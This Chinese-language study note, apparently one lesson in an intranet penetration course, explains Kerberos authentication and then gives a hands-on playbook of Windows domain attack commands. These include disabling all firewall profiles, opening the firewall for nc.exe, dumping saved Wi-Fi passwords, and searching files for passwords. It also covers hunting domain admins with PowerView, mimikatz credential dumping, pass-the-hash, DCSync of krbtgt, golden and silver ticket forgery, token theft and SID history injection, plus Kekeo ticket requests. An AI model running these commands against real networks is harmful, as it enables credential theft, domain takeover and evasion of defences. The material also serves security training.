
## Kerberos 认证
---
### 概述

**Kerberos 认证**是**为 TCP/IP 网络系统设计的可信第三方认证协议**，用于在非安全网络中对个人通信进行安全的身份认证。Kerberos 最初由美国麻省理工学院（MIT）为 Athena 项目开发，以希腊神话中 Hades 的三头保卫神犬命名。

**核心组件**：Kerberos 认证系统的核心组件是**密钥分发中心（KDC）**，它包含认证服务器（AS）和票据授予服务器（TGS）。KDC 存储着所有用户的密钥等信息，用于认证用户身份并分发票据。

**加密技术**：**Kerberos 采用客户端 / 服务器结构与 DES 对称加密算法**，也可用其他算法替代，能够进行相互认证，即客户端和服务器端均可对对方进行身份认证，是一种应用对称密钥体制进行密钥管理的系统，可以用于防止窃听、防止重放攻击、保护数据完整性等场合。

>**DES**：早期 Kerberos 版本（如 Kerberos v4）曾主要使用 DES 算法，但 DES 因密钥长度较短（56 位），安全性较低，现在已很少被推荐使用。
>**AES**：现代 Kerberos 实现（如 Kerberos v5）普遍采用 AES 作为默认加密算法。AES 密钥长度更长（128 位、192 位、256 位），安全性更高，已成为当前主流选择。

**应用范围**：Kerberos 已成为计算机领域广泛接受的标准，被 Windows、Mac OS X、Red Hat Enterprise Linux 等多种操作系统默认支持，可轻松实现不同平台之间的互操作。

>**KDC**：全称为 **Key Distribution Center**，中文表述为 **密钥分发中心**。它是整个认证系统的核心所在，主要承担生成、分发以及管理加密密钥与票据的重要职责。KDC 由两个关键部分构成，分别是负责初始身份验证的 **认证服务器（AS）** 和负责发放服务访问票据的 **票据授予服务器（TGS）**。
>**TGT**：全称为 **Ticket-Granting Ticket**，中文称作 **票据授予票据**。它是一种具有时效性的加密票据，其作用是证明用户身份的合法性。用户在成功通过初始认证之后，会得到这个 TGT。凭借 TGT，用户能够向 KDC 中的 TGS 申请访问特定服务所需的票据，而无需再次提交用户名和密码。

**当我了解TGT后，我感觉它类似于网站的Cookie，因此将这两项放一起对比了一下：**

1.**身份标识**：

**TGT**：证明用户身份，用于向 KDC 请求访问服务的票据。
**Cookie**：存储用户会话 ID 或身份信息，用于在浏览器和网站之间保持状态（如登录状态）。

2.**时效性**：两者通常都有过期时间（如几小时或几天），过期后需重新验证。

3.**核心区别**

| **特性**     | **TGT（Kerberos）**                                                                                    | **Cookie（Web）**                                                                                                    |
| ---------- | ---------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| **加密与安全性** | **强加密**：使用对称密钥加密（如 AES），票据内容不可篡改。  <br>**双向认证**：客户端和服务器都需验证票据有效性。  <br>**防重放攻击**：通过时间戳和序列号防止票据被重复使用。 | **通常不加密**：Cookie 内容可能是明文或简单哈希（如 JWT），需依赖 HTTPS 保证安全。  <br>**单向认证**：主要由服务器验证客户端。  <br>**易受攻击**：可能被窃取（XSS）或篡改（CSRF）。 |
| **分发机制**   | **通过 KDC 分发**：TGT 由可信的密钥分发中心（KDC）生成，需用户密码参与加密。                                                       | **由服务器直接下发**：Cookie 由网站服务器通过 HTTP 响应头（`Set-Cookie`）发送给浏览器。                                                         |
| **作用范围**   | **跨服务访问**：单个 TGT 可用于访问多个关联服务（如企业内网的邮件、文件服务器等）。                                                       | **单域名限制**：Cookie 通常只能在设置它的域名下使用（如`example.com`）。                                                                   |
| **存储位置**   | **安全存储**：通常存储在客户端的内存或安全令牌缓存中（如 Windows 的 LSA）。                                                       | **浏览器存储**：存储在浏览器的 Cookie 文件或内存中，可能被第三方访问（如浏览器插件）。                                                                  |
| **验证方式**   | **动态验证**：每次使用 TGT 请求服务票据时，KDC 都会验证其有效性。                                                              | **静态验证**：服务器通过比对 Cookie 中的会话 ID 或签名验证用户身份。                                                                         |

**角色组成 kerberos协议中存在三个角色，分别是 ：**

1. 客户端(client):发送请求的一方 
2. 服务端(Server）：接收请求的一方 
3. 密钥分发中心(Key Distribution Center,KDC)，KDC一般放在域控上，或者说域控扮演KDC的角色。 而密钥分发中心一般又分为两部分，分别是:
	- AS(Authentication Server):认证服务器，专门用来认证客户端的身份并发放客户用于访问 TGS的TGT(票据授 予票据) 
	- TGS(Ticket Granting Ticket)：票据授予服务器，用来发放整个认证过程以及客户端访问+服务端时所需的服务授予票据(Ticket) 

### 认证过程

客户端首先向认证服务器（AS）发送认证请求，AS 验证用户身份后，生成票据授权票据（TGT）并用用户密码加密发送给客户端。客户端使用自己的密码解密得到 TGT，然后用 TGT 向票据授予服务器（TGS）请求访问特定服务的票据。TGS 验证 TGT 有效后，生成服务票据（ST）发送给客户端，客户端将服务票据（ST）发送给相应的服务端，服务端验证票据无误后，为客户端提供服务。可以大致分为三个步骤：

- 客户端向AS请求TGT
- 客户端使用TGT向TGS请求服务票据ST
- 客户端使用服务票据向服务发送认证请求

![[Pasted image 20250719172735.png]]

i. **AS_REQ**: Client向KDC发起ASREQ,请求凭据是Client hash加密的时间戳 
ii. **AS_REP**: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT 里面包含PAC,PAC包含Client的sid，Client所在的组。
![[Pasted image 20250719175936.png]]
iii. TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGSREQ请求 
iv. TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash加密的TGS票据(这一 步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据ST)
![[Pasted image 20250719180021.png]]
v. CS_REQ: Client拿着TGS票据（ST）去请求服务 
vi. CS_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC询问KDC该Client有没有访 问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有 访问服务的权限。
![[Pasted image 20250719180058.png]]

## 内网信息收集
---

**概述**

渗透测试流程
![[Pasted image 20250719182416.png]]
内网渗透流程
![[Pasted image 20250719182444.png]]
内网信息收集主要是针对公司的网络结构，网络连通性，域信息，用户信息等。包括： 

```
- 本地信息收集（手动/自动）
- IP扫描技术
- 端口扫描技术
- 域内基础信息
- 查找/定位域控
- 获取域内用户
- 定位域管理员 
```

各类环境说明 

1. 云环境、云资产:这种基本没有内网，除非找到关键信息,例如VPN账号密码 
2. 公司或机房机器:可能具备内网环境

一般我们控制内网机器的手段是两种 

1. 通过web的形式，通过漏洞，使用WebShell管理工具进行连接 
2. 通过钓鱼或者近源使用CS进行连接

>很多时候就算有WebShell环境，一般也使用CS等工具进行渗透，因为做横向移动等操作时更加方便。

## 本地信息收集基础操作
---

```bash
# 查看系统架构信息 
echo %PROCESSOR_ARCHITECTURE% 

# 查看已安装的软件及版本 
cmd.exe： 
wmic product get name,version 
powershell: 
powershell "Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version" 

# 查看运行中的服务 
wmic service list brief 

# 查看运行中的进程，注意安全软件等进程 
wmic process list brief 
tasklist /svc 

# 查看电脑启动项 
wmic startup get command,caption 

# 查看计划任务 
schtasks /query /fo LIST /v 
# 本命令在本机查看效果更佳 
# 如果出现错误，执行以下命令 
chcp 437 

# 查看电脑开机时间 
net statistics workstation 

# 查看本地用户信息 
wmic useraccount get name,sid =======================很重要========================= net user 

# 查看会话情况 
net session 

# 查看端口信息及连接情况 
netstat -ano 

# 查看共享文件夹信息 
wmic share get name,path,status 
net share 

# 查看路由信息 
route print 

# 查看防火墙信息 
netsh firewall show state 

# Windows Server 2003 之前关闭防火墙: 
netsh firewall set opmode disable 

# Windows Server 2003 之后关闭防火墙: 
netsh advfirewall firewall set opmode disable # 这个一般只会关掉域的防火墙 
netsh advfirewall set allprofiles state off # 这个会把所有防火墙都关掉 

# 查看防火墙配置 
netsh firewall show config 

# 查看RDP等凭证信息 
cmdkey /l 

# 查看ARP信息 
arp -a 

# 查看代理配置信息 
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" 

# 查看最近打开的文件 
dir %APPDATA%\Microsoft\Windows\Recent 

# 查看本地工作组信息 
net localgroup 

# 查看管理员组成员 
net localgroup administrators
```

## 防火墙相关操作
---

```bash
# 放行指定程序（如nc.exe） 

# 2003及之前版本 
netsh firewall add allowedprogram c:\nc.exe "allownc" enable 
# 2003之后的版本 
netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe" 

# 放行指定程序的退出 
netsh advfirewall firewall add rule name="Allownc" dir=out action=allow program="C:\nc.exe" 

# 放行3389端口（远程桌面端口） 
netsh advfirewall firewall add rule name="RemoteDesktop" protocol=TCP dir=in localport=3389 action=allow
```

## 远程桌面相关操作
---

```bash
# 查看RDP端口 
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP Tcp" /v PortNumber 

# 开启远程桌面 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 

# 关闭远程桌面 
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f 

# 查看RDP凭证 
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\* 

# 查询出来了 RDP 的端口后，可以使用下面的命令查看该端口是否开放 
# netstat -ano | findstr <PortNumber>
# 示例: 
netstat -ano | findstr 3389
```

## WiFi信息收集
---

```bash
# 查看连接过的Wi-Fi网络名称 
netsh wlan show profiles 

# 获取特定Wi-Fi网络的密码 
netsh wlan show profile name="xxx" key=clear 

# 获取所有Wi-Fi网络及其密码 
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
```

## 杀毒软件查询
---

使用下面的命令可以罗列出当前机器中安装的杀毒软件：

```bash
wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list
```

下面是一些常见的杀毒软件的进程名，如果通过`tasklist`查看到了下面的应用信息，则证明目标安装了对应的杀毒软件：

```bash
 "360tray.exe": "360安全卫士‐实时保护"
 "360safe.exe": "360安全卫士‐主程序"
 "ZhuDongFangYu.exe": "360安全卫士‐主动防御"
 "360sd.exe": "360杀毒"
 "a2guard.exe": "a‐squared杀毒"
 "ad‐watch.exe": "Lavasoft杀毒"
 "cleaner8.exe": "The Cleaner杀毒"
 "vba32lder.exe": "vb32杀毒"
 "MongoosaGUI.exe": "Mongoosa杀毒"
 "CorantiControlCenter32.exe": "Coranti2012杀毒"
 "F‐PROT.exe": "F‐Prot AntiVirus"
 "CMCTrayIcon.exe": "CMC杀毒"
 "K7TSecurity.exe": "K7杀毒"
 "UnThreat.exe": "UnThreat杀毒"
 "CKSoftShiedAntivirus4.exe": "Shield Antivirus杀毒"
 "AVWatchService.exe": "VIRUSfighter杀毒"
 "ArcaTasksService.exe": "ArcaVir杀毒"
 "iptray.exe": "Immunet杀毒"
 "PSafeSysTray.exe": "PSafe杀毒"
 "nspupsvc.exe": "nProtect杀毒"
```

## 基本信息手动收集
---

```bash
# 查询当前用户权限
whoami
wmic useraccount

# 查询当前用户所属组
whoami /groups   

# 判断域是否存在
ipconfig /all
systeminfo
net config workstation
net time /domain

# 显示基本网络信息
ipconfig 
# 显示详细网络信息，可以看到 DNS 信息
ipconfig /all 

# 获取主机名称
hostname  

# 可以查看系统信息（Windows Or Linux），系统版本，系统补丁信息
systeminfo 

# 收集系统补丁信息
wmic qfe get Caption,Description,HotFixID,InstalledOn

# 收集当前机器软件信息
wmic product get name,version

# 收集当前机器服务信息
wmic service list brief

# 收集当前机器开机自启程序信息
wmic startup get command,caption

收集当前机器计划任务信息
schtasks /query /fo LIST /v
```

**whoami可能出现的几种情况：**

- 本地用户:机器名\用户名  
- 本地超管:机器名\administrator  
- 域用户:域名\用户名  
- 域超管:域名\administrator  
- 如果内网中存在域，只有本地system和域内用户可以查询域内信息。

## 查询域内组与成员
---

```bash
# 查询域内组信息
net group /domain
net group "Domain Admins" /domain

# 查询域内所有计算机
net view

# 查询域内密码策略
net accounts /domain
```

## 定位域控
---

```bash
# 查询域控列表
nltest /dclist:域名

# 查询域控的SRV记录
nslookup -type=SRV _ldap._tcp
用于查询域控制器的 LDAP 服务记录，帮助确定域控制器的可用性及相关信息。

# 查询域控的DNS
nslookup 域名

# 查询域控时间同步
net time /domain

# 查看域控所在的组
net group "Domain Controllers" /domain

# 查看当前登录的域控服务器
echo %LOGONSERVER%.%USERDNSDOMAIN%
```

## 获取域内用户
---

```bash
# 查询域内用户信息
net user /domain
net group "组名" /domain
```

## 定位域管理员
---

在内网中，通常会部署大量的网络安全系统和设备，例如IDS、IPS、日志审计、安全网关、反病毒软件等。在域网络攻击测试中，获取域内的一个支点后，需要获取域管理员权限。

在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限。也就是说，当计算机被添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中，因此域管理员组的成员均可访问本地计算机，且具备完全控制权限。

定位域内管理员的常规渠道，一是日志，二是会话。日志是指本地机器的管理员日志，可以使用脚本或Wevtutil工具导出并查看。会话是指域内每台机器的登录会话，可以使用netsess.exe或 PowerView 等工具查询(可以名查询，不需要权限)。

假设当前控制了一台域内主机，但是该主机上域管用户压根没有登录过。所以我们如果能找到域管理员在哪台电脑上登录过，该电脑就是首要攻击目标，结合密码抓取技术，可以轻易获取域管凭据。

### psloggedon.exe

​ 在Windows平台上，可以指定命令`net session`来查看谁使用了本机资源，但是没有命令来查看谁在使用远程计算机资源、谁登陆本地或远程计算机。

​ 使用`psloggedon.exe`可以查看本地登陆的用户和用过本地计算机或远程计算机的资源登陆的用户。如果指定的是用户名而不是计算机名，`psloggedon.exe`会搜索网上令居中的计算机，并限制该用户当前是否已经登陆。其原理是通过检查注册表HKEY_USERS项的key值来查询谁登陆过（需要调用NetSessionEnum API），某些功能需要管理员权限才能使用

```bash
查看登录过本地计算机的账户
    PsLoggedon.exe -l
-l:仅显示本地登陆，不显示本地和网络资源登陆
```

---

#### PVEFindADUser.exe

PVEFindADUser.exe 可用于查找活动目录用户登陆的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括查找本地用户。通过RDP远程桌面登陆的用户、通过运行服务和计划任务的用户。运行该工具需要计算机配置.NET Framework 2.0 环境，.NET大于2.0的版本也不行。运行此工具无需管理员权限。

查询域中所有主机当前登录的用户，我们一般直接运行命令，即可显示域中所有计算机上当前登陆的所有用户。

```bash
PVEFindADUser.exe -current
```

查询结果保存在当前目录的.csv文件中

---

#### PowerView.ps1

powerview脚本可以用来获取当前域管理员在线登录的服务器。

Invoke-UserHunter：搜索本地域中域管理员当前在线的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限。

```bash
Set-ExecutionPolicy Bypass -Scope Process -Force 
#PowerShell执行策略限制,默认阻止脚本运行，临时允许当前会话

Import-Module .\powerview.ps1
Invoke-UserHunter
```

即可获得所有域管理员当前在线的主机

---

信息收集查询流程：

```bash
net view /domain 查看当前域名
net view /domain:域名 查看域内部所有计算机名
net group /domain 查看域内部所有用户组列表
net group "domain computers" /domain 查看所有域成员计算机列表
net accounts /domain 查看域密码信息
nltest /domian_trusts 获取域信任信息 
nltest /DCLIST:域名 查看域控制器机器名 
net time /domain 查看当前时间，因为时间服务器也是主域服务器，可以看到域服务器的机器名 
net group "Domain Controllers" /domain 查看域控制器组，因为可能有不止一台域控，有主备之分 
net user /domain 查询域内用户，会看到熟悉的krbtgt用户 
wmic useraccount get /all 获取域内用户详细信息 
dsquery user 查看域内存在的用户 
net localgroup administrators 查看本地管理员用户组 
net group "domain admins" /domain 查询域管理员用户
```

## 敏感数据定位
---

对本电脑上各类敏感文件进行收集，例如word文档、txt文件、pdf文件、xls文件等。不排除有些情况下，工作人员直接将密码放在某个文档中。此外，可以找找数据库连接配置文件。内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术数据等。可以说，价值较高的数据基本都在内网中。

![[Pasted image 20250719210638.png]]

```bash
# 查找敏感文件（如备份、配置文件等）
dir /a /s /b c:\"*bak*"
dir /a /s /b c:\"*txt*"
dir /a /s /b c:\"*xml*"
dir /a /s /b c:\"*mdb*"
dir /a /s /b c:\"*mdf*"
dir /a /s /b c:\"*sql*"
dir /a /s /b c:\"*eml*"
dir /a /s /b c:\"*pst*"

# 查找文件中包含密码的关键字
findstr /si pass *.inc *.config *.ini *.txt *.asp *.php *.jsp *.xml *.cgi *.bak
findstr /si pwd *.inc *.config *.ini *.txt *.asp *.php *.jsp *.xml *.cgi *.bak
findstr /si password *.inc *.config *.ini *.txt *.asp *.php *.jsp *.xml *.cgi *.bak
findstr /si login *.inc *.config *.ini *.txt *.asp *.php *.jsp *.xml *.cgi *.bak
```

## 基本信息自动收集
---

### CS插件扫描

**LSTAR**

![[Pasted image 20250719215903.png]]

**Ladon（拉冬）**

![[Pasted image 20250719220019.png]]

**OLa（欧拉）**

![[Pasted image 20250719220117.png]]

**TaoWu（梼杌）**

![[Pasted image 20250719220205.png]]

**谢公子插件**

![[Pasted image 20250719220247.png]]

### mimikatz

#### 概述

Mimikatz 是一个用于 Windows 操作系统的工具，由 **Benjamin Delpy** 开发。它主要用于**提取凭据、内存分析、哈希传递、令牌操作、Kerberos 票据伪造、权限提升**等操作。

#### 模块和命令

```bash
standard:标准模块，基本命令
crypto:加密模块
sekurlsa:证书模块
kerberos:kerberos模块
privilege:提权模块
process:进程模块
service：服务模块
lsadump:LsaDump模块
ts:终端服务器模块
event:事件模块
misc:杂项
token:令牌操作模块
sid:安全表示模块


version:查看版本
exit:退出
cls:清屏
其中常用的是privilege、sekurlsa、kerberos、lsadump、token、sid模块
```

##### privilege

该模块是用于提权的模块，很多模块需要高权限运行，所以要先进行提权。

只能用具有管理员权限的命令行窗口才可以执行成功，普通用户使用提权命令会失败。

```bash
privilege::debug
```

##### sekurlsa

该模块需要先提权至debug，常用于读取密码、HASH传递

```bash
sekurlsa::wdigest   通过可逆的方式去内存中读取明文密码 
sekurlsa::Kerberos  假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码 
sekurlsa::logonPasswords    通过以上各种方法读取明文密码 

sekurlsa::pth               哈希传递 
sekurlsa::pth /user:administrator/domain:host1 /ntlm:cdf34cda4e455232323xxxx 
sekurlsa::pth /user:administrator/domain:host1 /aes256:cdf34cda4e455232323xxxx
```

##### lsadump

对Local Security Authiruty(LSA)进行密码抓取的模块

```bash
# 通过DSync导出指定用户的Hash，格式化输出
lsadump::dcsync /domain:xiaosun.com /user:krbtgt /csv
 
# 通过DSync导出指定用户的密码Hash的详细信息
lsadump::dcsync /domain:xiaosun.com /user:krbtgt
 
# 通过DSync导出所有用户的Hash
lsadump::dcsync /domain:xiaosun.com /all /csv
 
# 读取所有域用户的Hash，需要在域控上以管理员权限打开窗口
privilege::debug
lsadump::lsa /patch
 
# 从sam.hive和system.hive文件中获得NTLM Hash
reg save hklm\sam sam.hive
reg save hklm\system system.hive
lsadump::sam /sam:sam.hive /system:system.hive
 
# 从本地SAM文件中读取密码Hash
privilege::debug
token::elevate
lsadump::sam
```

##### kerberos

```bash
# 查看内存中的kerberos TGT
mimikatz.exe "kerberos::tgt" exit
 
# 查看内存中所有的Kerberos票据
mimikatz.exe "kerberos::list" exit
 
# 清除票据
mimikatz.exe "kerberos::purge" exit
 
# 将票据注入到内存中
mimikatz.exe "kerberos::ptt administrator.kirbi" exit
 
# 黄金票据传递攻击
kerberos::golden /user:要伪造的域用户 /domain:域名 /sid:域的sid /krbtgt:krbtgt的哈希或AES Key /ptt
 
# 白银票据传递攻击
kerberos::golden /user:要伪造的域用户 /domain:域名 /sid:域的sid /target:服务机器 /service:指定服务如cifs、ldap /rc4:服务账户的Hash /ptt
```

##### token

```bash
# 列出当前进程的token信息
token::whoami
token::whoami /full
 
# 列出当前系统中存在的token，高权限流出的token最全面
token::list
 
# 窃取指定token id的token
token::elevate /id
 
# 窃取System权限的token（默认）
token::elevate /system
 
# 窃取域管理员的token
token::elevate /domainadmin
 
# 窃取企业管理员的token
token::elevate /enterpriseadmin
 
# 窃取本地管理员的token
token::elevate /admin
 
# 窃取Local Service权限的token
token::elevate /localservice
 
# 窃取Network service权限的token
token::elevate /networkservice
 
# 恢复为之前的token
token::revert
```

##### sid

```bash
# 查询指定对象的SID
sid::lookup /name:xuan
 
# 查询指定SID对应的对象
sid::lookup /sid:S-1-5-21-1982601180-2087634876-2293013296-1001
 
# 通过samAccountName属性查询对象的一些信息
sid::query /sam:lzx
 
# 通过SID属性查询对象的一些信息
sid::query /sid:S-1-5-21-2952760202-1353902439-2381784089-1109
 
# 通过samAccountName属性修改对象的SID
sid::patch
sid::modify /sam:liu /new:S-1-5-21-2952760202-1353902439-2381784089-109
 
# 通过sid属性修改对象的SID
sid::patch
sid::modify /sid:S-1-5-21-1982601180-2087634876-2293013296-1001 /new:S-1-5-21-2952760202-1353902439-2381784089-109
 
# 通过samAccountName属性给对象添加一个SID History属性
sid::patch
sid::add /sam:lzx /new:S-1-5-21-2952760202-1353902439-2381784089-109
 
# 通过sid属性给对象添加一个SID History属性
sid::patch
sid::add /sid:S-1-5-21-1982601180-2087634876-2293013296-1001 /new:S-1-5-21-2952760202-1353902439-2381784089-109
 
# 将administrator的SID添加到test的SID History属性中
sid::patch
sid::add /sam:lzx /new:administrator
 
# 清除指定samAccountName对象的SID History属性
sid::clear /sam:xuan
 
# 清除指定sid对象的SID History属性
sid::clear /sid:S-1-5-21-1982601180-2087634876-2293013296-1001
```

---

### **Kekeo**

#### 介绍

Kekeo 是一个 **高级 Kerberos 认证攻击工具**，由 **Benjamin Delpy（Mimikatz 的作者）** 开发。它主要用于**Kerberos 认证机制的渗透测试**，能够执行**Kerberos 票据操作、身份伪造、NTLM 传递攻击（PTT）、服务票据伪造（Silver Ticket）、黄金票据（Golden Ticket）等**。与 Mimikatz 不同，**Kekeo 专注于 Kerberos 票据攻击**，适用于域渗透、横向移动、权限维持等场景。

#### 常用模块和命令

```
- ask: 请求 TGT（AS-REQ）
- tgt: 解析 TGT（TGS-REQ）
- tgs: 解析 TGS
- kirbi: 票据操作模块
- ticket: 票据管理
- exit: 退出
```

##### **ask**

请求 Kerberos 认证票据（TGT）。

```bash
ask /user:administrator /domain:xiaosun.com /rc4:NTLM-Hash /ptt
```

- `/user`: 目标用户名
- `/domain`: 目标域
- `/rc4`: NTLM 哈希
- `/ptt`: 直接注入票据

##### **tgt**

获取 TGT 并注入内存

```bash
tgt::request /user:administrator /domain:god.org /rc4:NTLM-Hash /ptt
```

- `/user`: 目标用户名
- `/domain`: 目标域
- `/rc4`: NTLM 哈希
- `/ptt`: 直接注入票据

##### **tgs**

请求服务票据（TGS）

```bash
tgs::request /user:administrator /domain:god.org /service:cifs/dc01.god.org /rc4:NTLM-Hash /ptt
```

- `/service`: 目标服务，如 `cifs`、`http`、`ldap`
- `/ptt`: 直接注入票据

##### **kirbi**

对 Kerberos 票据进行操作，如保存、转换等

```bash
kirbi::export /file:ticket.kirbi
kirbi::import /file:ticket.kirbi
```

- `export`: 导出票据
- `import`: 导入票据

##### **ticket**

管理 Kerberos 票据，如查看、导入、清除等。

```bash
ticket::list
ticket::purge
```

- `list`: 查看内存中的票据
- `purge`: 清除票据


---

上一篇：[[L4-5 内网基础1]]                    下一篇：[[L4-7 内网基础3]]
